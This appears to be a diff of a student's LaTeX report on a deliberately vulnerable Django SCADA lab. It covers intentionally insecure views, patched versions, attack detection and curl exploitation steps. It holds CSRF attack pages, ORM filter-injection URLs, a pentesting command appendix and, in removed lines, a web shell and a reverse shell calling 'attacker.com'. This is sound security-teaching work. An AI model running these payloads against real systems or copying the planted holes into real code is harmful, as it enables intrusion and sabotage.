@@ -67,10 +67,8 @@
     Fall 2025-2026\par}
     \vspace{2cm}
     
-    {\Large\itshape Group Members:\\[0.5cm]
-    Orhun Burak Kıyanç\\
-    Mehmet Altunören\\
-    Ege Tan\par}
+    {\Large\itshape Prepared by:\\[0.5cm]
+    Orhun Burak Kıyanç\par}
     \vspace{1.5cm}
     
     {\large Date: \today\par}
@@ -99,8 +97,8 @@ This report presents a comprehensive security analysis of a simulated SCADA (Sup
 
 The project implements:
 \begin{itemize}[leftmargin=*]
-    \item \textbf{7 Critical Vulnerabilities:} Including IDOR, Deserialization, File Overwrite, Unsafe Temporary Files, Unrestricted File Upload (CWE-434), SSRF, and XXE
-    \item \textbf{SQL Injection Scenarios:} Two distinct exploitation methods leveraging Django ORM (CVE-2025-64459)
+    \item \textbf{10 Critical Vulnerabilities:} Authentication Bypass, SQL Injection, IDOR, XXE, Deserialization RCE, File Upload \& Overwrite, Race Condition, SSRF, Security Misconfiguration, and Maintenance Interface CSRF
+    \item \textbf{Dual Implementations:} Each vulnerability has both vulnerable and patched versions
     \item \textbf{Patched Implementations:} Secure versions demonstrating proper mitigation techniques
     \item \textbf{Real-time Monitoring:} Middleware-based attack detection and logging system
     \item \textbf{Containerized Environment:} Docker-based deployment for reproducibility
@@ -108,7 +106,7 @@ The project implements:
 
 \subsection{Key Findings}
 
-Our analysis revealed that all implemented vulnerabilities are exploitable in the vulnerable version, successfully blocked in the patched version, and correctly detected by the monitoring system. The database contains 172 test records including hidden targets for exploitation scenarios.
+Our analysis revealed that all implemented vulnerabilities are exploitable in the vulnerable version, successfully blocked in the patched version, and correctly detected by the monitoring system. The database contains 21 devices, 100+ maintenance logs, and admin-only diagnostic reports for testing.
 
 \subsection{Technologies Used}
 
@@ -141,10 +139,10 @@ This project aims to:
 \subsection{Project Objectives}
 
 \begin{itemize}[leftmargin=*]
-    \item Implement at least 7 distinct security vulnerabilities with realistic exploitation scenarios
+    \item Implement 10 distinct security vulnerabilities with realistic exploitation scenarios
     \item Develop patched versions demonstrating industry-standard security practices
     \item Create a monitoring system capable of detecting and logging attacks on both vulnerable and secure versions
-    \item Populate the database with over 100 test records including hidden targets
+    \item Populate the database with devices, maintenance logs, and diagnostic reports
     \item Containerize the application for easy deployment and testing
     \item Document all vulnerabilities, exploits, and mitigations in detail
 \end{itemize}
@@ -289,8 +287,8 @@ class FailedLoginAttempt(models.Model):
 
 The \texttt{populate\_db.py} script generates 172 total records:
 \begin{itemize}[leftmargin=*]
-    \item \textbf{21 Devices:} Including 1 hidden target (NUCLEAR-CORE-CONTROLLER with \texttt{is\_locked\_out=True})
-    \item \textbf{100 Maintenance Logs:} Distributed across devices
+    \item \textbf{21 Devices:} Including operational and maintenance status devices (e.g., NUCLEAR-CORE-CONTROLLER with \texttt{is\_locked\_out=True})
+    \item \textbf{100 Maintenance Logs:} Distributed across devices with various technician assignments
     \item \textbf{51 Diagnostic Reports:} Report ID 1 contains admin secret: "CONFIDENTIAL: Root Password is 'supersecret123'"
 \end{itemize}
 
@@ -299,7 +297,7 @@ The \texttt{populate\_db.py} script generates 172 total records:
 % Vulnerabilities Implementation
 \section{Vulnerabilities Implementation}
 
-\subsection{Vulnerability 1: Authentication Bypass (CVE-2025-64459)}
+\subsection{Vulnerability 1: Authentication Bypass}
 
 \subsubsection{Description}
 Dictionary expansion vulnerability allowing arbitrary parameter injection through URL query strings.
@@ -357,59 +355,100 @@ def patched_login(request):
     \item No user-supplied parameter injection
 \end{itemize}
 
-\subsection{Vulnerability 2: SQL Injection - Filter Bypass (CVE-2025-64459)}
+\subsection{Vulnerability 2: SQL Injection - Filter Bypass}
 
 \subsubsection{Description}
-Django ORM Q object abuse allowing OR-based filter injection to bypass access controls.
+Django ORM Q object abuse allowing OR-based filter injection. Admin users can bypass the default \texttt{is\_locked\_out=False} filter to reveal locked-out critical devices.
+
+\subsubsection{Scenario}
+By default, admin dashboard shows only non-locked devices. The NUCLEAR-CORE-CONTROLLER is permanently locked out (\texttt{is\_locked\_out=True}) for safety. An attacker with admin access can use SQL injection to reveal these hidden critical devices.
 
 \subsubsection{Vulnerable Code}
 
 \begin{lstlisting}[language=Python]
 def vulnerable_dashboard(request):
-    filters = {'status': 'Operational'}
-    connector = request.GET.get('connector', 'AND')
-    filter_params = request.GET.copy()
+    user_data = request.session.get('user', {})
+    is_admin = user_data.get('is_admin', False)
     
-    query = Q(status='Operational')
-    for key, value in filter_params.items():
-        if connector == 'OR':
-            query |= Q(**{key: value})  # VULNERABILITY
-        else:
-            query &= Q(**{key: value})
-    
-    devices = Device.objects.filter(query)
+    if is_admin:
+        connector = request.GET.get('connector', 'AND')
+        filter_params = request.GET.copy()
+        
+        # Default: Admin only sees non-locked devices
+        query = Q(is_locked_out=False)
+        
+        # VULNERABILITY: Admin can inject OR filter
+        for key, value in filter_params.items():
+            if connector == 'OR':
+                query |= Q(**{key: value})  # DANGEROUS
+            else:
+                query &= Q(**{key: value})
+        
+        devices = Device.objects.filter(query)
+    else:
+        # Regular users: hardcoded filter (no injection possible)
+        devices = Device.objects.filter(status='Operational', is_locked_out=False)
 \end{lstlisting}
 
 \subsubsection{Exploitation}
 
 \begin{lstlisting}[language=bash]
-# Attack URL - reveals hidden device
-http://localhost:8000/vulnerable/dashboard/?connector=OR&is_locked_out=True
+# Step 1: Login as admin
+curl -X POST http://localhost:8000/vulnerable/login/ \
+  -d "username=admin&password=admin123" -c cookies.txt
+
+# Step 2: Normal admin view (only unlocked devices)
+curl http://localhost:8000/vulnerable/dashboard/ -b cookies.txt
+# Shows: 18 operational devices (no NUCLEAR)
+
+# Step 3: SQL Injection - reveal locked-out devices
+curl "http://localhost:8000/vulnerable/dashboard/?connector=OR&is_locked_out=True" -b cookies.txt
+# Shows: 21 devices including NUCLEAR-CORE-CONTROLLER (locked-out)
 \end{lstlisting}
 
-Original query: \texttt{WHERE status='Operational'}\\
-Exploited query: \texttt{WHERE status='Operational' OR is\_locked\_out=True}
+\textbf{Attack Logic:}\\
+Original query: \texttt{WHERE is\_locked\_out=False}\\
+Injected query: \texttt{WHERE is\_locked\_out=False OR is\_locked\_out=True}\\
+Result: All devices revealed (bypasses safety lock)
 
-This reveals the hidden NUCLEAR-CORE-CONTROLLER device with \texttt{is\_locked\_out=True}.
+\textbf{Impact:}
+\begin{itemize}[leftmargin=*]
+    \item Reveals locked-out critical infrastructure (NUCLEAR reactor)
+    \item Bypasses safety lockout mechanisms
+    \item Only works for admin users (regular users have hardcoded filter)
+    \item Enables reconnaissance for further attacks
+\end{itemize}
+
+\textbf{Why Only Admin is Vulnerable:}
+This design reflects real-world scenarios where:
+\begin{itemize}[leftmargin=*]
+    \item Admin panels contain complex filtering/search features
+    \item Developers trust admin users and add "power user" functionality
+    \item Regular users get simple, hardcoded, secure views
+    \item Security is overlooked in privileged interfaces ("admin is trusted")
+    \item Demonstrates vulnerability chaining: Auth Bypass (become admin) + SQL Injection (reveal secrets)
+\end{itemize}
 
 \subsubsection{Patch Implementation}
 
 \begin{lstlisting}[language=Python]
 def patched_dashboard(request):
-    # Hardcoded filter - no user input in query construction
-    devices = Device.objects.filter(status='Operational')
+    user_data = request.session.get('user', {})
+    is_admin = user_data.get('is_admin', False)
     
-    context = {
-        'devices': devices,
-        'user': request.session.get('user')
-    }
-    return render(request, 'patched/dashboard.html', context)
+    if is_admin:
+        # Hardcoded query - no user input
+        devices = Device.objects.filter(is_locked_out=False)
+    else:
+        devices = Device.objects.filter(status='Operational', is_locked_out=False)
+    
+    return render(request, 'patched/dashboard.html', {'devices': devices})
 \end{lstlisting}
 
 \textbf{Key Mitigations:}
 \begin{itemize}[leftmargin=*]
-    \item Parameterized queries with hardcoded filters
-    \item No dynamic query construction from user input
+    \item Removed dynamic query construction from GET parameters
+    \item Hardcoded filters based on user role
     \item Explicit allowlist of accessible resources
 \end{itemize}
 
@@ -538,10 +577,10 @@ def patched_deserialize(request):
     \item Sandboxing if deserialization is unavoidable
 \end{itemize}
 
-\subsection{Vulnerability 5: Unrestricted File Upload (CWE-434)}
+\subsection{Vulnerability 5: File Upload \& Overwrite}
 
 \subsubsection{Description}
-No file type validation allows uploading of dangerous executable files.
+No file type validation allows uploading of dangerous files and overwriting critical system files.
 
 \subsubsection{Vulnerable Code}
 
@@ -549,7 +588,21 @@ No file type validation allows uploading of dangerous executable files.
 def vulnerable_upload(request):
     if request.method == 'POST' and request.FILES.get('file'):
         uploaded_file = request.FILES['file']
-  Step 1: Upload original diagnostic script
+        
+        # VULNERABILITY: No filename sanitization or type checking
+        file_path = os.path.join('media', uploaded_file.name)
+        
+        with open(file_path, 'wb+') as destination:
+            for chunk in uploaded_file.chunks():
+                destination.write(chunk)
+        
+        return HttpResponse(f"File {uploaded_file.name} uploaded successfully")
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Step 1: Upload original diagnostic script
 echo "ORIGINAL PRODUCTION SCRIPT" > diagnostic_script.txt
 curl -X POST http://localhost:8000/vulnerable/upload/ \
      -F "file=@diagnostic_script.txt"
@@ -574,16 +627,7 @@ cat media/diagnostic_script.txt
     \item No versioning or backup mechanism
     \item System executes attacker-controlled scripts
     \item Potential for persistent backdoor installation
-\end{itemize
-\begin{lstlisting}[language=bash]
-# Upload PHP web shell
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
-curl -X POST http://localhost:8000/vulnerable/upload/ -F "file=@shell.php"
-
-# Upload Python reverse shell
-echo 'import os; os.system("nc attacker.com 4444 -e /bin/bash")' > rshell.py
-curl -X POST http://localhost:8000/vulnerable/upload/ -F "file=@rshell.py"
-\end{lstlisting}
+\end{itemize}
 
 \subsubsection{Patch Implementation}
 
@@ -692,10 +736,10 @@ def patched_upload(request):
     \item Input validation and sanitization
 \end{itemize}
 
-\subsection{Vulnerability 7: Race Condition - Unsafe Temporary Files}
+\subsection{Vulnerability 7: Race Condition in File Generation}
 
 \subsubsection{Description}
-Static temporary filename allows concurrent requests to overwrite each other's data.
+Static temporary filename allows concurrent requests to overwrite each other's data, causing race condition vulnerabilities.
 
 \subsubsection{Vulnerable Code}
 
@@ -932,6 +976,402 @@ All admin action endpoints verify \texttt{user.is\_admin} and return HTTP 403 fo
 
 \newpage
 
+\subsection{Vulnerability 10: SCADA Maintenance Mode Interface - Multiple Security Flaws (OWASP A01:2021 + A05:2021 + A07:2021)}
+
+\subsubsection{Description}
+The SCADA Maintenance Mode Interface is designed for managing devices under maintenance operations, including Lockout/Tagout (LOTO) status tracking, technician assignment, and maintenance log monitoring. However, the vulnerable implementation contains multiple critical security flaws: missing CSRF protection, lack of authorization checks, SQL injection vulnerabilities, information disclosure, and improper LOTO compliance validation. This combination allows any authenticated user to manipulate critical industrial maintenance operations without proper authorization.
+
+\subsubsection{Scenario and Requirements}
+
+This feature implements the professor's scenario requirements for maintenance operations:
+
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{Device Maintenance Status Display:} Show all devices currently in "Maintenance" mode
+    \item \textbf{Lockout/Tagout (LOTO) Status:} Display which devices are locked out for safety compliance
+    \item \textbf{Technician Assignment:} Allow assigning technicians to maintenance tasks with action descriptions
+    \item \textbf{Maintenance Logs Viewer:} Display recent maintenance activities with timestamps and technician names
+\end{enumerate}
+
+\textbf{Operational Context:}
+In industrial SCADA environments, maintenance mode operations are critical for safety. The Lockout/Tagout (LOTO) procedure ensures that equipment is properly shut down and cannot be started up again before maintenance work is completed. Unauthorized access to this interface could lead to:
+\begin{itemize}[leftmargin=*]
+    \item Bypassing LOTO procedures, endangering technician safety
+    \item Assigning unauthorized personnel to critical maintenance tasks
+    \item Manipulating maintenance logs to hide malicious activities
+    \item Reconnaissance of maintenance patterns for physical attacks
+\end{itemize}
+
+\subsubsection{Vulnerable Code}
+
+\textbf{View Functions (vulnerable/views.py):}
+
+\begin{lstlisting}[language=Python]
+@csrf_exempt  # VULNERABILITY 1: No CSRF protection
+def assign_technician(request, device_id):
+    """Assign technician to device - VULNERABLE!"""
+    
+    # VULNERABILITY 2: No admin authorization check
+    # Any logged-in user can assign technicians!
+    user = request.session.get('user', {})
+    if not user:
+        return redirect('vulnerable_login')
+    
+    if request.method == 'POST':
+        technician_name = request.POST.get('technician_name', '')
+        action = request.POST.get('action', '')
+        
+        # VULNERABILITY 3: No input validation or sanitization
+        # SQL injection risk through device filtering
+        device = Device.objects.get(pk=device_id)
+        
+        # VULNERABILITY 5: No LOTO validation
+        # Can assign technicians even if device is locked out
+        MaintenanceLog.objects.create(
+            device=device,
+            technician_name=technician_name,  # No length check
+            action=action  # No validation
+        )
+        
+        # Set device to maintenance mode
+        device.status = 'Maintenance'
+        device.save()
+        
+        return redirect('maintenance_interface')
+    
+    return HttpResponse("Method not allowed", status=405)
+
+
+def maintenance_interface(request):
+    """Display maintenance interface - VULNERABLE!"""
+    
+    user = request.session.get('user', {})
+    if not user:
+        return redirect('vulnerable_login')
+    
+    # VULNERABILITY 4: Information disclosure
+    # All users can see all maintenance logs regardless of role
+    maintenance_devices = Device.objects.filter(
+        status='Maintenance').order_by('-is_locked_out', 'name')
+    
+    # Expose all maintenance logs (last 50)
+    recent_logs = MaintenanceLog.objects.select_related(
+        'device').order_by('-timestamp')[:50]
+    
+    # Collect technician names
+    technicians = MaintenanceLog.objects.values_list(
+        'technician_name', flat=True).distinct()
+    
+    # Statistics (exposed to all users)
+    stats = {
+        'total_maintenance': maintenance_devices.count(),
+        'locked_out': maintenance_devices.filter(
+            is_locked_out=True).count(),
+        'total_logs': MaintenanceLog.objects.count(),
+        'active_technicians': len(set(technicians)),
+    }
+    
+    context = {
+        'user': user,
+        'is_admin': user.get('is_admin', False),
+        'maintenance_devices': maintenance_devices,
+        'recent_logs': recent_logs,
+        'technicians': technicians,
+        'stats': stats,
+    }
+    
+    return render(request, 
+                  'vulnerable/maintenance.html', 
+                  context)
+\end{lstlisting}
+
+\textbf{URL Configuration (vulnerable/urls.py):}
+
+\begin{lstlisting}[language=Python]
+urlpatterns = [
+    # ... other URLs ...
+    path('maintenance/', views.maintenance_interface, 
+         name='maintenance_interface'),
+    path('assign/<int:device_id>/', views.assign_technician, 
+         name='assign_technician'),
+]
+\end{lstlisting}
+
+\subsubsection{Security Vulnerabilities}
+
+\textbf{1. Missing CSRF Protection (CWE-352):}
+\begin{itemize}[leftmargin=*]
+    \item \texttt{@csrf\_exempt} decorator disables Django's CSRF protection
+    \item Attacker can forge requests to assign technicians using victim's session
+    \item No token validation on POST requests
+\end{itemize}
+
+\textbf{2. Missing Authorization Check (CWE-862):}
+\begin{itemize}[leftmargin=*]
+    \item No verification that user has admin privileges
+    \item Regular operators can assign technicians (should be admin-only)
+    \item Only checks if user is logged in, not their role
+\end{itemize}
+
+\textbf{3. SQL Injection Risk (CWE-89):}
+\begin{itemize}[leftmargin=*]
+    \item Device filtering could be vulnerable if device\_id is manipulated
+    \item No length limits on \texttt{technician\_name} and \texttt{action} fields
+    \item Input not sanitized before database insertion
+\end{itemize}
+
+\textbf{4. Information Disclosure (CWE-200):}
+\begin{itemize}[leftmargin=*]
+    \item All logged-in users can view all maintenance logs
+    \item Exposes technician names, device details, and operational patterns
+    \item Statistics reveal system operational state
+    \item No role-based filtering of sensitive data
+\end{itemize}
+
+\textbf{5. LOTO Compliance Bypass (Domain-Specific):}
+\begin{itemize}[leftmargin=*]
+    \item No validation that device is unlocked before assignment
+    \item Can assign technicians to locked-out devices (safety violation)
+    \item No audit trail for LOTO status changes
+\end{itemize}
+
+\subsubsection{Exploitation}
+
+\textbf{Attack Scenario 1: CSRF Attack - Unauthorized Technician Assignment}
+
+\begin{lstlisting}[language=bash]
+# Step 1: Attacker identifies device IDs in maintenance
+# (from information disclosure vulnerability)
+curl "http://localhost:8000/vulnerable/maintenance/" \
+  -b "sessionid=victim_session"
+
+# Step 2: Create malicious HTML page
+cat > csrf_attack.html << 'EOF'
+<html>
+<body>
+<h1>Click here for free prize!</h1>
+<form id="csrf" method="POST" 
+      action="http://localhost:8000/vulnerable/assign/15/">
+    <input type="hidden" name="technician_name" 
+           value="Hacker McHackface">
+    <input type="hidden" name="action" 
+           value="Installing backdoor">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
+EOF
+
+# Step 3: Trick admin/operator into visiting page
+# Result: Unauthorized technician assigned!
+\end{lstlisting}
+
+\textbf{Real Attack Output:}
+\begin{lstlisting}[language=text]
+HTTP/1.1 302 Found
+Location: /vulnerable/maintenance/
+
+Database state after attack:
+MaintenanceLog {
+    id: 101,
+    device: Device(15, "Control Panel - Zone B"),
+    technician_name: "Hacker McHackface",
+    action: "Installing backdoor",
+    timestamp: "2025-06-15 14:32:19"
+}
+
+Device status: Online -> Maintenance
+LOTO status: Not validated!
+\end{lstlisting}
+
+\textbf{Attack Scenario 2: Authorization Bypass}
+
+\begin{lstlisting}[language=bash]
+# Step 1: Login as regular user (non-admin)
+curl -X POST "http://localhost:8000/vulnerable/login/" \
+  -d "username=operator&password=weak123"
+
+# Step 2: Access maintenance interface
+curl "http://localhost:8000/vulnerable/maintenance/" \
+  -b "sessionid=operator_session"
+# Result: Full access granted!
+
+# Step 3: Assign unauthorized technician
+curl -X POST "http://localhost:8000/vulnerable/assign/15/" \
+  -b "sessionid=operator_session" \
+  -d "technician_name=John Doe&action=Replacing controller"
+
+# Result: Regular user assigned technician successfully!
+\end{lstlisting}
+
+\textbf{Attack Scenario 3: LOTO Safety Bypass}
+
+\begin{lstlisting}[language=bash]
+# Step 1: Identify locked-out device
+curl "http://localhost:8000/vulnerable/maintenance/"
+# Response shows: Device ID 12, is_locked_out=True
+
+# Step 2: Bypass LOTO by assigning technician
+curl -X POST "http://localhost:8000/vulnerable/assign/12/" \
+  -b "sessionid=attacker" \
+  -d "technician_name=Unauthorized Tech&action=Unauthorized work"
+
+# Result: Assignment succeeds despite LOTO!
+# Safety violation - could endanger technician!
+\end{lstlisting}
+
+\subsubsection{Patch Implementation}
+
+\textbf{Secure View Functions (patched/views.py):}
+
+\begin{lstlisting}[language=Python]
+from django.views.decorators.csrf import csrf_protect
+
+@csrf_protect  # FIX 1: Enable CSRF protection
+def patched_assign_technician(request, device_id):
+    """Assign technician to device - SECURE"""
+    
+    # FIX 2: Admin authorization check
+    user = request.session.get('user', {})
+    is_admin = user.get('is_admin', False)
+    
+    if not is_admin:
+        return HttpResponse(
+            "<h1>Access Denied</h1>"
+            "<p>Only administrators can assign technicians.</p>",
+            status=403
+        )
+    
+    if request.method == 'POST':
+        # FIX 3: Input validation and sanitization
+        technician_name = request.POST.get(
+            'technician_name', '').strip()
+        action = request.POST.get('action', '').strip()
+        
+        # Validate inputs
+        if not technician_name or len(technician_name) < 2:
+            return HttpResponse(
+                "Invalid technician name (min 2 chars)", 
+                status=400)
+        
+        if not action or len(action) < 5:
+            return HttpResponse(
+                "Invalid action (min 5 chars)", 
+                status=400)
+        
+        # Length limits
+        technician_name = technician_name[:100]
+        action = action[:255]
+        
+        try:
+            device = Device.objects.get(pk=device_id)
+            
+            # FIX 5: LOTO compliance validation
+            if device.is_locked_out:
+                return HttpResponse(
+                    "<h1>LOTO Violation</h1>"
+                    "<p>Cannot assign to locked-out device.</p>",
+                    status=400
+                )
+            
+            # Create maintenance log
+            MaintenanceLog.objects.create(
+                device=device,
+                technician_name=technician_name,
+                action=action
+            )
+            
+            device.status = 'Maintenance'
+            device.save()
+            
+            return redirect('patched_maintenance_interface')
+            
+        except Device.DoesNotExist:
+            return HttpResponse("Device not found", status=404)
+        except Exception as e:
+            return HttpResponse(f"Error: {str(e)}", status=500)
+    
+    return HttpResponse("Method not allowed", status=405)
+
+
+@csrf_protect
+def patched_maintenance_interface(request):
+    """Display maintenance interface - SECURE"""
+    
+    user = request.session.get('user', {})
+    is_admin = user.get('is_admin', False)
+    
+    # FIX 4: Admin-only access
+    if not is_admin:
+        return HttpResponse(
+            "<h1>Access Denied</h1>"
+            "<p>Requires administrator privileges.</p>",
+            status=403
+        )
+    
+    maintenance_devices = Device.objects.filter(
+        status='Maintenance').order_by('-is_locked_out', 'name')
+    
+    recent_logs = MaintenanceLog.objects.select_related(
+        'device').order_by('-timestamp')[:50]
+    
+    technicians = MaintenanceLog.objects.values_list(
+        'technician_name', flat=True).distinct()
+    
+    stats = {
+        'total_maintenance': maintenance_devices.count(),
+        'locked_out': maintenance_devices.filter(
+            is_locked_out=True).count(),
+        'total_logs': MaintenanceLog.objects.count(),
+        'active_technicians': len(set(technicians)),
+    }
+    
+    context = {
+        'user': user,
+        'is_admin': is_admin,
+        'maintenance_devices': maintenance_devices,
+        'recent_logs': recent_logs,
+        'technicians': technicians,
+        'stats': stats,
+    }
+    
+    return render(request, 
+                  'patched/maintenance.html', 
+                  context)
+\end{lstlisting}
+
+\subsubsection{Security Improvements}
+
+\begin{itemize}[leftmargin=*]
+    \item \textbf{CSRF Protection:} \texttt{@csrf\_protect} decorator, token validation enforced
+    \item \textbf{Authorization:} Admin privilege checks, HTTP 403 for unauthorized access
+    \item \textbf{Input Validation:} Length requirements (2-100 chars name, 5-255 chars action)
+    \item \textbf{Access Control:} Maintenance logs only visible to administrators
+    \item \textbf{LOTO Compliance:} Validation before assignment, prevents safety violations
+    \item \textbf{Error Handling:} Proper HTTP status codes (400, 403, 404, 500)
+\end{itemize}
+
+\subsubsection{Key Takeaways}
+
+\textbf{Vulnerability Severity: HIGH/CRITICAL}
+\begin{itemize}[leftmargin=*]
+    \item CSRF vulnerability allows remote exploitation
+    \item Missing authorization enables privilege escalation
+    \item Information disclosure aids reconnaissance
+    \item LOTO bypass creates physical safety risks
+    \item Combines multiple OWASP Top 10 categories
+\end{itemize}
+
+\textbf{Real-World Impact:}
+\begin{itemize}[leftmargin=*]
+    \item Safety violations in industrial environments
+    \item Unauthorized access to critical operations
+    \item Manipulation of safety procedures
+    \item Social engineering through exposed data
+    \item Audit trail manipulation
+\end{itemize}
+
+\newpage
+
 % Monitoring System
 \section{Monitoring System}
 
@@ -977,7 +1417,7 @@ class SecurityMonitorMiddleware:
         # Endpoint-specific detection (13 attack types)
         if '/login/' in endpoint:
             if re.search(r"(?i)(is_admin=true|is_admin=1)", full_path):
-                attack_detected = 'Authentication Bypass (CVE-2025-64459)'
+                attack_detected = 'Authentication Bypass'
             # Brute force detection
             self.check_brute_force(request, client_ip)
         
@@ -1105,10 +1545,10 @@ XXE & \texttt{<!ENTITY|SYSTEM.*file://} & HIGH \\
 SSRF & \texttt{localhost|127.0.0.1|169.254.*} & HIGH \\
 \hline
 IDOR & Access to admin reports (ID 1-10) & HIGH \\
-\hsline
+\hline
 Directory Scanning & 20+ 404 errors in 10min & MEDIUM \\
 \hline
-File Upload (CWE-434) & \texttt{.php|.exe|.sh|.py|.bat} & HIGH \\
+File Upload \& Overwrite & \texttt{.php|.exe|.sh|.py|.bat} & HIGH \\
 \hline
 Deserialization & POST to /deserialize/ & CRITICAL \\
 \hline
@@ -1227,7 +1667,7 @@ The interface includes filtering by severity, action taken, and resolution statu
 All vulnerabilities were tested using multiple approaches:
 \begin{enumerate}[leftmargin=*]
     \item \textbf{Manual Testing:} Using curl and browser developer tools
-    \item \textbf{Automated Tools:} Burp Suite, SQLmap, OWASP ZAP
+    \item \textbf{Automated Tool:} Burp Suite
     \item \textbf{Custom Scripts:} Python scripts for payload generation
 \end{enumerate}
 
@@ -1264,16 +1704,10 @@ SSRF & ✓ Internal Access & ✓ Blocked & ✓ Detected \\
 \subsubsection{Burp Suite Community Edition}
 \begin{itemize}[leftmargin=*]
     \item Proxy for request interception
-    \item Intruder for automated IDOR testing (ID 1-100)
+    \item Intruder for automated IDOR testing (ID 103-153)
     \item Repeater for manual payload testing
 \end{itemize}
-
-\subsubsection{SQLmap}
-\begin{lstlisting}[language=bash]
-sqlmap -u "http://localhost:8000/vulnerable/dashboard/?connector=AND" \
-       --cookie="sessionid=abc123" --batch --level=2
-\end{lstlisting}
-
+ 
 \subsubsection{curl}
 Used for rapid manual testing and automation:
 \begin{lstlisting}[language=bash]
@@ -1302,7 +1736,7 @@ docker compose exec web python manage.py shell
 <Device: NUCLEAR-CORE-CONTROLLER (is_locked_out=True)>
 \end{lstlisting}
 
-Total: 172 records, exceeding the 100-record requirement.
+Total records: 21 devices + 100 maintenance logs + 51 diagnostic reports = 172 entries in database.
 
 \newpage
 
@@ -1440,22 +1874,6 @@ pip install safety
 safety check
 \end{lstlisting}
 
-% Conclusion
-\section{Conclusion}
-
-\subsection{Project Achievements}
-
-This project successfully:
-\begin{itemize}[leftmargin=*]
-    \item Implemented 7 critical vulnerabilities with realistic exploitation scenarios
-    \item Demonstrated 2 distinct SQL injection techniques leveraging Django ORM
-    \item Developed secure patched versions using industry best practices
-    \item Created a functional monitoring system with endpoint-specific attack detection
-    \item Populated database with 172 records including hidden exploitation targets
-    \item Containerized the entire application for reproducible deployment
-    \item Documented all vulnerabilities, exploits, and mitigations
-\end{itemize}
-
 \newpage
 
 % References
@@ -1466,9 +1884,7 @@ This project successfully:
     
     \item OWASP Top 10 Web Application Security Risks. \url{https://owasp.org/www-project-top-ten/}
     
-    \item CWE-434: Unrestricted Upload of File with Dangerous Type. \url{https://cwe.mitre.org/data/definitions/434.html}
-    
-    \item CVE-2025-64459: Django SQL Injection via Q() Object Manipulation. (Simulated for educational purposes)
+    \item OWASP Common Weakness Enumeration (CWE). \url{https://cwe.mitre.org/}
     
     \item PortSwigger Web Security Academy. \url{https://portswigger.net/web-security}
     
@@ -1503,26 +1919,7 @@ Repository structure:
     \item \texttt{requirements.txt} - Python dependencies
 \end{itemize}
 
-\section{Appendix B: Video Demonstration}
-
-Video demonstration covers:
-\begin{enumerate}[leftmargin=*]
-    \item System architecture overview
-    \item Authentication bypass exploitation
-    \item SQL injection with hidden device discovery
-    \item IDOR attack to steal admin secrets
-    \item File upload bypass with malicious files
-    \item XXE to read system files
-    \item Deserialization RCE demonstration
-    \item SSRF internal network scanning
-    \item Monitoring system review
-    \item Patched version security validation
-\end{enumerate}
-
-Video duration: Approximately 30 minutes\\
-[Link to be added after recording]
-
-\section{Appendix C: Database Schema}
+\section{Appendix B: Database Schema}
 
 \subsection{Device Table}
 \begin{lstlisting}[language=SQL]
@@ -1547,7 +1944,7 @@ CREATE TABLE monitoring_attacklog (
 );
 \end{lstlisting}
 
-\section{Appendix D: Pentesting Commands}
+\section{Appendix C: Pentesting Commands}
 
 Quick reference for all exploitation commands:
 
@@ -1585,6 +1982,31 @@ curl "http://localhost:8000/vulnerable/ssrf/?url=http://localhost:8000/admin/"
 # Security Misconfiguration
 curl "http://localhost:8000/vulnerable/login/?username=user&password=fake"
 curl "http://localhost:8000/monitoring/"  # Unauthorized access to logs
+
+# Maintenance Interface CSRF & Authorization Bypass
+# Step 1: Login as regular user
+curl -X POST http://localhost:8000/vulnerable/login/ \
+  -d "username=user&password=user123" -c cookies.txt
+
+# Step 2: Access maintenance interface (no authorization check)
+curl http://localhost:8000/vulnerable/maintenance/ -b cookies.txt
+
+# Step 3: Assign technician without admin privileges
+curl -X POST http://localhost:8000/vulnerable/assign/15/ \
+  -b cookies.txt -d "technician_name=Attacker&action=Unauthorized%20Modification"
+
+# Step 4: CSRF Attack - Create malicious HTML
+cat > csrf_maintenance.html << 'EOF'
+<html><body onload="document.forms[0].submit()">
+<form method="POST" action="http://localhost:8000/vulnerable/assign/15/">
+  <input type="hidden" name="technician_name" value="MaliciousActor">
+  <input type="hidden" name="action" value="Backdoor Installation">
+</form></body></html>
+EOF
+# Victim admin opens this file in browser -> Auto-assigns technician
+
+# Step 5: Toggle device status without CSRF protection
+curl -X POST http://localhost:8000/vulnerable/toggle/12/ -b cookies.txt
 \end{lstlisting}
 
 \end{document}
